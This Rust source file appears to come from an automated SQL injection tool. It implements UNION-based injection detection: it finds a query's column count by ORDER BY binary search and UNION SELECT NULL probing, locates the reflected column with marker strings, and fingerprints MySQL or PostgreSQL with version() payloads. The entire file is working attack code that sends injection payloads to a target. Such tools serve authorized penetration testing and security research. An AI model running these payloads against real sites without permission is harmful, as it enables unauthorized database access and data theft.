//! UNION-based SQL injection detection

use crate::sqli::core::{DBMS, NULL, ORDER_BY_STEP, ORDER_BY_MAX, CHAR_START, CHAR_STOP};
use crate::sqli::request::{Request, comparison, page_ratio};
use anyhow::Result;
use regex::Regex;

/// UNION injection vector
#[derive(Debug, Clone)]
pub struct UnionVector {
    pub count: usize,      // Number of columns
    pub position: usize,   // Injectable column position
    pub prefix: String,    // Payload prefix (e.g., "-1")
    pub suffix: String,    // Payload suffix (e.g., "-- -")
    pub char: String,      // Character to use (NULL or specific)
    pub dbms: DBMS,        // Detected database type
}

/// Find number of columns using ORDER BY technique
pub async fn find_union_char_count(request: &Request<'_>, baseline: &str) -> Result<Option<usize>> {
    // First try ORDER BY technique (binary search)
    if let Some(count) = order_by_technique(request, baseline).await? {
        return Ok(Some(count));
    }
    
    // Fallback to UNION NULL technique
    union_null_technique(request, baseline).await
}

/// ORDER BY binary search technique
async fn order_by_technique(request: &Request<'_>, baseline: &str) -> Result<Option<usize>> {
    // First check if ORDER BY 1 works and ORDER BY 9999 fails
    let page1 = request.query_page("1 ORDER BY 1-- -").await?;
    let page_high = request.query_page("1 ORDER BY 9999-- -").await?;
    
    // Check for error patterns in high ORDER BY
    let error_patterns = [
        r"(?i)(warning|error):",
        r"(?i)order (by|clause)",
        r"(?i)unknown column",
        r"(?i)failed",
    ];
    
    let has_error_high = error_patterns.iter().any(|p| {
        if let Ok(re) = Regex::new(p) {
            re.is_match(&page_high) && !re.is_match(baseline)
        } else {
            false
        }
    });
    
    // Also check if page_high is significantly different from baseline
    let ratio_high = page_ratio(&page_high, baseline);
    let ratio_1 = page_ratio(&page1, baseline);
    
    // ORDER BY 1 should work (similar to baseline), ORDER BY 9999 should fail
    if ratio_1 > 0.9 && (has_error_high || ratio_high < 0.5) {
        // Binary search for exact column count
        let mut low = 1;
        let mut high = ORDER_BY_STEP;
        
        // First find upper bound
        while high <= ORDER_BY_MAX {
            let page = request.query_page(&format!("1 ORDER BY {}-- -", high)).await?;
            let ratio = page_ratio(&page, baseline);
            
            if ratio > 0.9 {
                low = high;
                high += ORDER_BY_STEP;
            } else {
                break;
            }
        }
        
        // Binary search between low and high
        while high - low > 1 {
            let mid = (low + high) / 2;
            let page = request.query_page(&format!("1 ORDER BY {}-- -", mid)).await?;
            let ratio = page_ratio(&page, baseline);
            
            if ratio > 0.9 {
                low = mid;
            } else {
                high = mid;
            }
        }
        
        return Ok(Some(low));
    }
    
    Ok(None)
}

/// UNION SELECT NULL technique
async fn union_null_technique(request: &Request<'_>, baseline: &str) -> Result<Option<usize>> {
    for count in 1..=20 {
        let nulls = vec![NULL; count].join(",");
        let payload = format!("-1 UNION SELECT {}-- -", nulls);
        let page = request.query_page(&payload).await?;
        
        // Check for column count mismatch errors
        let mismatch_patterns = [
            r"(?i)number of columns",
            r"(?i)operand should contain",
            r"(?i)used in select statements",
            r"(?i)different number",
        ];
        
        let has_mismatch = mismatch_patterns.iter().any(|p| {
            if let Ok(re) = Regex::new(p) {
                re.is_match(&page)
            } else {
                false
            }
        });
        
        if !has_mismatch && page.len() > 100 {
            // Verify by checking count+1 causes error
            let nulls_plus = vec![NULL; count + 1].join(",");
            let payload_plus = format!("-1 UNION SELECT {}-- -", nulls_plus);
            let page_plus = request.query_page(&payload_plus).await?;
            
            let plus_has_mismatch = mismatch_patterns.iter().any(|p| {
                if let Ok(re) = Regex::new(p) {
                    re.is_match(&page_plus)
                } else {
                    false
                }
            });
            
            if plus_has_mismatch || page_plus.len() < page.len() / 2 {
                return Ok(Some(count));
            }
        }
    }
    
    Ok(None)
}

/// Find which column position reflects in output
pub async fn find_position(request: &Request<'_>, count: usize) -> Result<usize> {
    for pos in 0..count {
        let mut cols: Vec<String> = vec![NULL.to_string(); count];
        let marker = format!("{}TEST{}", CHAR_START, CHAR_STOP);
        cols[pos] = format!("'{}'", marker);
        
        let payload = format!("-1 UNION SELECT {}-- -", cols.join(","));
        let page = request.query_page(&payload).await?;
        
        if page.contains(&marker) {
            return Ok(pos);
        }
    }
    
    // Try with CONCAT for MySQL
    for pos in 0..count {
        let mut cols: Vec<String> = vec![NULL.to_string(); count];
        let marker = format!("{}TEST{}", CHAR_START, CHAR_STOP);
        cols[pos] = format!("CONCAT('{}')", marker);
        
        let payload = format!("-1 UNION SELECT {}-- -", cols.join(","));
        let page = request.query_page(&payload).await?;
        
        if page.contains(&marker) {
            return Ok(pos);
        }
    }
    
    // Default to position 1 (second column) if count > 1
    Ok(if count > 1 { 1 } else { 0 })
}

/// Fingerprint database type
pub async fn fingerprint_dbms(request: &Request<'_>, count: usize, position: usize) -> Result<DBMS> {
    let mut cols: Vec<String> = vec![NULL.to_string(); count];
    
    // Try MySQL VERSION()
    cols[position] = format!("CONCAT('{}',VERSION(),'{}')", CHAR_START, CHAR_STOP);
    let payload = format!("-1 UNION SELECT {}-- -", cols.join(","));
    let page = request.query_page(&payload).await?;
    
    if let Some(version) = extract_between(&page, CHAR_START, CHAR_STOP) {
        if version.to_lowercase().contains("mysql") || version.to_lowercase().contains("mariadb") {
            return Ok(DBMS::MySQL);
        }
        if version.to_lowercase().contains("postgresql") {
            return Ok(DBMS::PostgreSQL);
        }
        // If we got any version string, it's likely MySQL
        if !version.is_empty() && version.chars().any(|c| c.is_ascii_digit()) {
            return Ok(DBMS::MySQL);
        }
    }
    
    // Try PostgreSQL version()
    cols[position] = format!("'{}'||version()||'{}'", CHAR_START, CHAR_STOP);
    let payload = format!("-1 UNION SELECT {}-- -", cols.join(","));
    let page = request.query_page(&payload).await?;
    
    if let Some(version) = extract_between(&page, CHAR_START, CHAR_STOP) {
        if version.to_lowercase().contains("postgresql") {
            return Ok(DBMS::PostgreSQL);
        }
    }
    
    // Default to MySQL as most common
    Ok(DBMS::MySQL)
}

/// Extract text between start and stop markers
fn extract_between(text: &str, start: &str, stop: &str) -> Option<String> {
    let start_idx = text.find(start)?;
    let after_start = &text[start_idx + start.len()..];
    let end_idx = after_start.find(stop)?;
    Some(after_start[..end_idx].to_string())
}

/// Full UNION detection - returns vector if injectable
pub async fn check_union(request: &Request<'_>) -> Result<Option<UnionVector>> {
    // Get baseline
    let baseline = request.query_page("1").await?;
    
    // Find column count
    let count = match find_union_char_count(request, &baseline).await? {
        Some(c) => c,
        None => return Ok(None),
    };
    
    tracing::info!("Target URL appears to have {} columns in query", count);
    
    // Find injectable position
    let position = find_position(request, count).await?;
    tracing::info!("Injectable column position: {}", position);
    
    // Fingerprint DBMS
    let dbms = fingerprint_dbms(request, count, position).await?;
    tracing::info!("Backend DBMS: {}", dbms);
    
    Ok(Some(UnionVector {
        count,
        position,
        prefix: "-1".to_string(),
        suffix: "-- -".to_string(),
        char: NULL.to_string(),
        dbms,
    }))
}
